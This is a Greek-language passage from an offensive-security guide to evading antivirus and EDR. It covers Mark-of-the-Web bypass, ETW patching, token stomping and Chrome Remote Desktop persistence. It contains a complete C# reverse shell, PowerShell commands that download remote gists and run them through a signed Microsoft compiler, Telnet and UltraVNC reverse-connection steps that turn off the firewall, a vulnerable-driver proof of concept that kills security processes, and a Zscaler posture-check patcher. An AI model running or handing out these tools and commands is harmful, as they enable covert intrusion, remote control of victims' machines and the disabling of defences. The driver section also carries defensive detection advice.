- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Το Alcatraz είναι ένας x64 binary obfuscator ικανός να obfuscate διάφορα PE αρχεία, συμπεριλαμβανομένων: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Το Metame είναι μια απλή metamorphic code engine για arbitrary executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): Το ROPfuscator είναι ένα fine-grained code obfuscation framework για LLVM-supported languages που χρησιμοποιεί ROP (return-oriented programming). Το ROPfuscator obfuscates ένα πρόγραμμα στο επίπεδο assembly code μετατρέποντας κανονικές εντολές σε ROP chains, δυσχεραίνοντας την φυσική μας αντίληψη της κανονικής ροής ελέγχου.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Το Nimcrypt είναι ένας .NET PE Crypter γραμμένος σε Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Το Inceptor μπορεί να μετατρέψει υπάρχοντα EXE/DLL σε shellcode και στη συνέχεια να τα φορτώσει

## SmartScreen & MoTW

Μπορεί να έχετε δει αυτή την οθόνη όταν κατεβάζετε κάποια εκτελέσιμα από το διαδίκτυο και τα εκτελείτε.

Microsoft Defender SmartScreen είναι ένας μηχανισμός ασφάλειας που αποσκοπεί στην προστασία του τελικού χρήστη από την εκτέλεση δυνητικά κακόβουλων εφαρμογών.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

Το SmartScreen λειτουργεί κυρίως με μια προσέγγιση βασισμένη στη φήμη, που σημαίνει ότι εφαρμογές με ασυνήθιστες λήψεις θα ενεργοποιούν το SmartScreen, ειδοποιώντας και εμποδίζοντας τον τελικό χρήστη να εκτελέσει το αρχείο (αν και το αρχείο μπορεί ακόμα να εκτελεστεί κάνοντας κλικ στο More Info -> Run anyway).

**MoTW** (Mark of The Web) είναι ένα [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) με το όνομα Zone.Identifier που δημιουργείται αυτόματα κατά τη λήψη αρχείων από το διαδίκτυο, μαζί με το URL από το οποίο κατεβάστηκε.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Έλεγχος του Zone.Identifier ADS για ένα αρχείο που κατέβηκε από το διαδίκτυο.</p></figcaption></figure>

> [!TIP]
> Είναι σημαντικό να σημειωθεί ότι εκτελέσιμα υπογεγραμμένα με ένα **trusted** signing certificate **δεν θα ενεργοποιήσουν το SmartScreen**.

Ένας πολύ αποτελεσματικός τρόπος για να αποτρέψετε τα payloads σας από το να λάβουν το Mark of The Web είναι να τα πακετάρετε μέσα σε κάποιο container όπως ένα ISO. Αυτό συμβαίνει επειδή το Mark-of-the-Web (MOTW) **δεν** μπορεί να εφαρμοστεί σε **μη NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) είναι ένα εργαλείο που πακετάρει payloads σε output containers για να αποφύγει το Mark-of-the-Web.

Παράδειγμα χρήσης:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) είναι ένας ισχυρός μηχανισμός καταγραφής στα Windows που επιτρέπει σε εφαρμογές και συστατικά του συστήματος να **καταγράφουν συμβάντα**. Ωστόσο, μπορεί επίσης να χρησιμοποιηθεί από προϊόντα ασφάλειας για να παρακολουθούν και να εντοπίζουν κακόβουλες ενέργειες.

Παρόμοια με το πώς το AMSI απενεργοποιείται (παρακάμπτεται), είναι επίσης δυνατό να κάνετε τη συνάρτηση **`EtwEventWrite`** της διεργασίας user space να επιστρέφει άμεσα χωρίς να καταγράφει οποιαδήποτε συμβάντα. Αυτό γίνεται με την τροποποίηση (patch) της συνάρτησης στη μνήμη ώστε να επιστρέφει άμεσα, ουσιαστικά απενεργοποιώντας την καταγραφή ETW για εκείνη τη διεργασία.

You can find more info in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Η φόρτωση δυαδικών C# στη μνήμη είναι γνωστή εδώ και αρκετό καιρό και εξακολουθεί να είναι ένας εξαιρετικός τρόπος για την εκτέλεση των post-exploitation εργαλείων σας χωρίς να εντοπιστούν από το AV.

Εφόσον το payload θα φορτωθεί απευθείας στη μνήμη χωρίς να αγγίξει το δίσκο, θα πρέπει να ανησυχούμε μόνο για το patching του AMSI για ολόκληρη τη διεργασία.

Τα περισσότερα C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, κ.λπ.) ήδη παρέχουν τη δυνατότητα να εκτελούν C# assemblies απευθείας στη μνήμη, αλλά υπάρχουν διαφορετικοί τρόποι για να το κάνετε:

- **Fork\&Run**

Αυτό περιλαμβάνει **το spawn μίας νέας "θυσιαζόμενης" διεργασίας**, την έγχυση του post-exploitation κακόβουλου κώδικα σε αυτή τη νέα διεργασία, την εκτέλεση του κακόβουλου κώδικα και, όταν τελειώσει, τον τερματισμό της νέας διεργασίας. Αυτό έχει τόσο πλεονεκτήματα όσο και μειονεκτήματα. Το πλεονέκτημα της μεθόδου fork and run είναι ότι η εκτέλεση συμβαίνει **έξω** από τη διεργασία του Beacon implant. Αυτό σημαίνει ότι αν κάτι στην post-exploitation ενέργειά μας πάει στραβά ή εντοπιστεί, υπάρχει **πολύ μεγαλύτερη πιθανότητα** το **implant μας να επιβιώσει.** Το μειονέκτημα είναι ότι έχετε **μεγαλύτερη πιθανότητα** να εντοπιστείτε από **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Αφορά την έγχυση του post-exploitation κακόβουλου κώδικα **στη δική του διεργασία**. Με αυτόν τον τρόπο, μπορείτε να αποφύγετε τη δημιουργία νέας διεργασίας και τον έλεγχο από AV, αλλά το μειονέκτημα είναι ότι αν κάτι πάει στραβά με την εκτέλεση του payload σας, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **χάσετε το beacon** καθώς μπορεί να καταρρεύσει.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Αν θέλετε να διαβάσετε περισσότερα για τη φόρτωση C# Assembly, δείτε αυτό το άρθρο [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) και το InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Μπορείτε επίσης να φορτώσετε C# Assemblies **από PowerShell**, δείτε [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) και το βίντεο του S3cur3th1sSh1t (https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Χρήση Άλλων Γλωσσών Προγραμματισμού

Όπως προτείνεται στο [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), είναι δυνατόν να εκτελέσετε κακόβουλο κώδικα χρησιμοποιώντας άλλες γλώσσες δίνοντας στη συμβιβασμένη μηχανή πρόσβαση **στο interpreter environment εγκατεστημένο στο Attacker Controlled SMB share**.

Επιτρέποντας πρόσβαση στα Interpreter Binaries και στο περιβάλλον στο SMB share μπορείτε να **εκτελέσετε arbitrary code σε αυτές τις γλώσσες μέσα στη μνήμη** της συμβιβασμένης μηχανής.

Το repo αναφέρει: Το Defender εξακολουθεί να σαρώσει τα scripts αλλά με την αξιοποίηση Go, Java, PHP κ.λπ. έχουμε **περισσότερη ευελιξία για να παρακάμψουμε στατικές υπογραφές**. Η δοκιμή με τυχαία μη-ομφακευμένα reverse shell scripts σε αυτές τις γλώσσες απέδειξε επιτυχία.

## TokenStomping

Το Token stomping είναι μια τεχνική που επιτρέπει σε έναν επιτιθέμενο να **χειραγωγήσει το access token ή ένα προϊόν ασφάλειας όπως ένα EDR ή AV**, επιτρέποντάς του να μειώσει τα προνόμια του ώστε η διεργασία να μην τερματιστεί αλλά να μην έχει δικαιώματα να ελέγχει για κακόβουλες δραστηριότητες.

Για να το αποτρέψει αυτό, τα Windows θα μπορούσαν να **αποτρέψουν εξωτερικές διεργασίες** από το να αποκτούν handles πάνω στα tokens των διεργασιών ασφάλειας.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Χρήση Εμπιστευμένου Λογισμικού

### Chrome Remote Desktop

Όπως περιγράφεται σε [**αυτό το blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), είναι εύκολο να αναπτύξετε το Chrome Remote Desktop σε έναν υπολογιστή στόχο και στη συνέχεια να το χρησιμοποιήσετε για να τον αναλάβετε και να διατηρήσετε persistence:
1. Κατεβάστε από https://remotedesktop.google.com/, κάντε κλικ στο "Set up via SSH", και μετά κάντε κλικ στο MSI file για Windows για να κατεβάσετε το MSI.
2. Εκτελέστε τον installer σιωπηλά στο θύμα (απαιτείται admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Επιστρέψτε στη σελίδα του Chrome Remote Desktop και κάντε κλικ στο επόμενο. Ο οδηγός θα σας ζητήσει να εξουσιοδοτήσετε· κάντε κλικ στο Authorize για να συνεχίσετε.
4. Εκτελέστε την παρασχεθείσα παράμετρο με κάποιες προσαρμογές: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Σημειώστε την παράμετρο pin που επιτρέπει την ρύθμιση του pin χωρίς χρήση του GUI).

## Advanced Evasion

Evasion είναι ένα πολύπλοκο ζήτημα, μερικές φορές πρέπει να λάβετε υπόψη πολλές διαφορετικές πηγές τηλεμετρίας σε ένα μόνο σύστημα, οπότε είναι σχεδόν αδύνατο να παραμείνετε τελείως αόρατοι σε ώριμα περιβάλλοντα.

Κάθε περιβάλλον στο οποίο επιτίθεστε θα έχει τα δικά του δυνατά και αδύνατα σημεία.

Σας προτρέπω έντονα να δείτε αυτή την ομιλία από [@ATTL4S](https://twitter.com/DaniLJ94), για να αποκτήσετε μια πρώτη εικόνα για πιο Advanced Evasion τεχνικές.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Αυτή είναι επίσης μια εξαιρετική ομιλία από [@mariuszbit](https://twitter.com/mariuszbit) σχετικά με Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Παλιές Τεχνικές**

### **Ελέγξτε ποια μέρη το Defender βρίσκει ως κακόβουλα**

Μπορείτε να χρησιμοποιήσετε [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) το οποίο θα **αφαιρεί τμήματα του δυαδικού** μέχρι να **ανακαλύψει ποιο τμήμα το Defender** βρίσκει ως κακόβουλο και να το διαχωρίσει για εσάς.\
Άλλο εργαλείο που κάνει **το ίδιο πράγμα είναι** [**avred**](https://github.com/dobin/avred) με μια ανοιχτή web υπηρεσία στο [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Μέχρι τα Windows10, όλα τα Windows περιείχαν έναν **Telnet server** που μπορούσατε να εγκαταστήσετε (ως administrator) κάνοντας:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Κάνε το **να ξεκινάει** όταν το σύστημα ξεκινά και **τρέξε** το τώρα:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Αλλαγή θύρας telnet** (stealth) και απενεργοποίηση firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Κατεβάστε το από: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (Θέλετε τα bin downloads, όχι το setup)

**ΣΤΟ HOST**: Εκτελέστε _**winvnc.exe**_ και διαμορφώστε τον server:

- Ενεργοποιήστε την επιλογή _Disable TrayIcon_
- Ορίστε κωδικό στο _VNC Password_
- Ορίστε κωδικό στο _View-Only Password_

Στη συνέχεια, μετακινήστε το δυαδικό _**winvnc.exe**_ και το **πρόσφατα** δημιουργημένο αρχείο _**UltraVNC.ini**_ μέσα στο **victim**

#### **Reverse connection**

Ο **attacker** θα πρέπει να **εκτελέσει μέσα στο** δικό του **host** το δυαδικό `vncviewer.exe -listen 5900` ώστε να είναι **προετοιμασμένος** να πιάσει μια αντίστροφη **VNC connection**. Έπειτα, μέσα στο **victim**: Εκκινήστε το winvnc daemon `winvnc.exe -run` και τρέξτε `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ΠΡΟΣΟΧΗ:** Για να διατηρήσετε την καλυπτικότητα δεν πρέπει να κάνετε μερικά πράγματα

- Μη ξεκινήσετε `winvnc` αν τρέχει ήδη ή θα προκαλέσετε ένα [popup](https://i.imgur.com/1SROTTl.png). Ελέγξτε αν τρέχει με `tasklist | findstr winvnc`
- Μη ξεκινήσετε `winvnc` χωρίς `UltraVNC.ini` στον ίδιο κατάλογο ή θα ανοίξει [το παράθυρο ρυθμίσεων](https://i.imgur.com/rfMQWcf.png)
- Μην τρέξετε `winvnc -h` για βοήθεια γιατί θα προκαλέσει ένα [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Κατεβάστε το από: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Μέσα στο GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Τώρα **ξεκίνα τον lister** με `msfconsole -r file.rc` και **εκτέλεσε** το **xml payload** με:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Ο τρέχων Defender θα τερματίσει τη διεργασία πολύ γρήγορα.**

### Μεταγλώττιση του δικού μας reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Πρώτο C# Revershell

Μεταγλωττίστε το με:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Χρησιμοποίησέ το με:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# με χρήση compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Αυτόματη λήψη και εκτέλεση:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Λίστα C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Παράδειγμα χρήσης python για την κατασκευή injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Άλλα εργαλεία
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Περισσότερα

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Απενεργοποίηση AV/EDR από Kernel Space

Η Storm-2603 αξιοποίησε ένα μικρό εργαλείο κονσόλας γνωστό ως **Antivirus Terminator** για να απενεργοποιήσει τις προστασίες endpoint πριν εγκαταστήσει ransomware. Το εργαλείο φέρνει τον **δικό του ευάλωτο αλλά *υπογεγραμμένο* driver** και τον καταχράται για να εκτελεί προνομιούχες λειτουργίες στον kernel που ακόμη και οι Protected-Process-Light (PPL) υπηρεσίες AV δεν μπορούν να μπλοκάρουν.

Κύρια συμπεράσματα
1. **Υπογεγραμμένος driver**: Το αρχείο που γράφεται στο δίσκο είναι `ServiceMouse.sys`, αλλά το δυαδικό είναι ο νόμιμα υπογεγραμμένος driver `AToolsKrnl64.sys` από το “System In-Depth Analysis Toolkit” της Antiy Labs. Επειδή ο driver φέρει έγκυρη υπογραφή Microsoft, φορτώνεται ακόμα και όταν το Driver-Signature-Enforcement (DSE) είναι ενεργό.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Η πρώτη γραμμή καταχωρεί τον driver ως **kernel service** και η δεύτερη τον ξεκινά έτσι ώστε το `\\.\ServiceMouse` να γίνει προσβάσιμο από το user land.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Τερματισμός οποιασδήποτε διεργασίας με PID (χρησιμοποιείται για να σκοτώσει υπηρεσίες Defender/EDR) |
| `0x990000D0` | Διαγραφή οποιουδήποτε αρχείου στο δίσκο |
| `0x990001D0` | Αποφόρτωση του driver και αφαίρεση της υπηρεσίας |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Γιατί λειτουργεί**: Το BYOVD παρακάμπτει πλήρως τις προστασίες σε user-mode; κώδικας που εκτελείται στον kernel μπορεί να ανοίξει *protected* διεργασίες, να τις τερματίσει ή να τροποποιήσει αντικείμενα του kernel ανεξάρτητα από PPL/PP, ELAM ή άλλα μέτρα ενίσχυσης.

Ανίχνευση / Αντιμετώπιση
•  Ενεργοποιήστε τη λίστα αποκλεισμού ευάλωτων drivers της Microsoft (`HVCI`, `Smart App Control`) ώστε τα Windows να αρνούνται τη φόρτωση του `AToolsKrnl64.sys`.
•  Παρακολουθήστε τη δημιουργία νέων *kernel* υπηρεσιών και ειδοποιείτε όταν ένας driver φορτώνεται από κατάλογο όπου μπορούν να γράψουν όλοι (world-writable) ή όταν δεν υπάρχει στη λίστα επιτρεπόμενων.
•  Παρακολουθείτε για user-mode handles σε προσαρμοσμένα device objects και ύποπτες κλήσεις `DeviceIoControl` στη συνέχεια.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Το **Client Connector** της Zscaler εφαρμόζει τοπικά κανόνες device-posture και βασίζεται στο Windows RPC για να επικοινωνήσει τα αποτελέσματα σε άλλα συστατικά. Δύο αδύναμες σχεδιαστικές επιλογές καθιστούν δυνατή πλήρη παράκαμψη:

1. Η αξιολόγηση posture γίνεται **αποκλειστικά client-side** (ένας boolean αποστέλλεται στον server).
2. Τα εσωτερικά RPC endpoints επαληθεύουν μόνο ότι το συνδεόμενο εκτελέσιμο είναι **υπογεγραμμένο από τη Zscaler** (μέσω `WinVerifyTrust`).

Με το **patching τεσσάρων υπογεγραμμένων δυαδικών αρχείων στο δίσκο** και οι δύο μηχανισμοί μπορούν να αδρανοποιηθούν:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Πάντα επιστρέφει `1` ώστε κάθε έλεγχος να θεωρείται συμβατός |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ οποιαδήποτε (ακόμα και μη υπογεγραμμένη) διαδικασία μπορεί να bind-άρει στα RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Αντικαταστάθηκε με `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Βραχυκυκλώθηκαν |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Μετά την αντικατάσταση των αρχικών αρχείων και την επανεκκίνηση του service stack:

* **Όλοι** οι έλεγχοι κατάστασης εμφανίζονται **πράσινοι/συμμορφούμενοι**.
* Μη υπογεγραμμένα ή τροποποιημένα binaries μπορούν να ανοίξουν τα named-pipe RPC endpoints (π.χ. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Ο παραβιασμένος host αποκτά απεριόριστη πρόσβαση στο εσωτερικό δίκτυο που ορίζεται από τις πολιτικές της Zscaler.

Αυτή η μελέτη περίπτωσης δείχνει πώς καθαρά client-side αποφάσεις εμπιστοσύνης και απλοί έλεγχοι υπογραφής μπορούν να παρακαμφθούν με λίγα byte patches.

## Κατάχρηση Protected Process Light (PPL) για να παραποιήσετε το AV/EDR με LOLBINs

Protected Process Light (PPL) επιβάλλει μια ιεραρχία signer/level ώστε μόνο προστατευμένες διεργασίες ίδιου ή ανώτερου επιπέδου να μπορούν να παραποιούν η μία την άλλη. Επιθετικά, αν μπορείτε νόμιμα να εκκινήσετε ένα PPL-enabled binary και να ελέγξετε τα arguments του, μπορείτε να μετατρέψετε μια ακίνδυνη λειτουργία (π.χ. logging) σε ένα περιορισμένο, από PPL υποστηριζόμενο write primitive ενάντια σε προστατευμένους καταλόγους που χρησιμοποιούνται από AV/EDR.

Τι κάνει μια διεργασία να τρέχει ως PPL
- Το στοχευόμενο EXE (και οποιεσδήποτε φορτωμένες DLLs) πρέπει να είναι υπογεγραμμένο(α) με ένα EKU ικανό για PPL.
- Η διεργασία πρέπει να δημιουργηθεί με CreateProcess χρησιμοποιώντας τις σημαίες: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Πρέπει να ζητηθεί ένα συμβατό protection level που ταιριάζει με τον signer του binary (π.χ., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` για anti-malware signers, `PROTECTION_LEVEL_WINDOWS` για Windows signers). Λανθασμένα επίπεδα θα αποτύχουν κατά τη δημιουργία.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Βοηθητικό ανοιχτού κώδικα: CreateProcessAsPPL (επιλέγει το protection level και προωθεί τα arguments στον target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Παράδειγμα χρήσης:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Το υπογεγραμμένο εκτελέσιμο συστήματος `C:\Windows\System32\ClipUp.exe` εκκινεί αντίγραφο του εαυτού του και δέχεται παράμετρο για να γράψει αρχείο καταγραφής σε διαδρομή που ορίζει ο καλών.
- Όταν εκκινείται ως διεργασία PPL, η εγγραφή αρχείου γίνεται με υποστήριξη PPL.
- Το ClipUp δεν μπορεί να αναλύσει διαδρομές που περιέχουν κενά· χρησιμοποιήστε 8.3 short paths για να δείξετε σε κανονικά προστατευμένες τοποθεσίες.

8.3 short path helpers
